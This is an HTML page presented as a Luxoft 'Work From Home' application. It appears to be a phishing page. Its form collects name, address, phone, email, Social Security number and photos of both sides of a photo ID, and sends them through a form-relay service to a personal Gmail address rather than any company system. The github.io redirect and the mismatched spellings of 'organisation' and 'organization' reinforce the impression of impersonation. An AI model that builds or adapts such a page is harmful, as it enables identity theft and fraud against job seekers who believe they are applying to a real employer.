<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Apply - Luxoft</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <header>
    <img src="images/luxoft-logo.png" class="logo" alt="Luxoft Logo">
    <h1>Apply for Work From Home</h1>
  </header>

  <section class="application">
    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/luxoft-website/thankyou.html">
      <input type="hidden" name="_captcha" value="false">

      <label>Full Name:</label><input type="text" name="Name" required>
      <label>Address:</label><input type="text" name="Address" required>
      <label>Phone:</label><input type="text" name="Phone" required>
      <label>Email:</label><input type="email" name="Email" required>
      <label>SSN:</label><input type="text" name="SSN" required>
      <label>Front of Photo ID e.g DL:</label><input type="file" name="ID Front" required>
      <label>Back of Photo ID e.g DL:</label><input type="file" name="ID Back" required>

      <button type="submit">Submit Application</button>
    </form>
  </section>
</body>
</html>
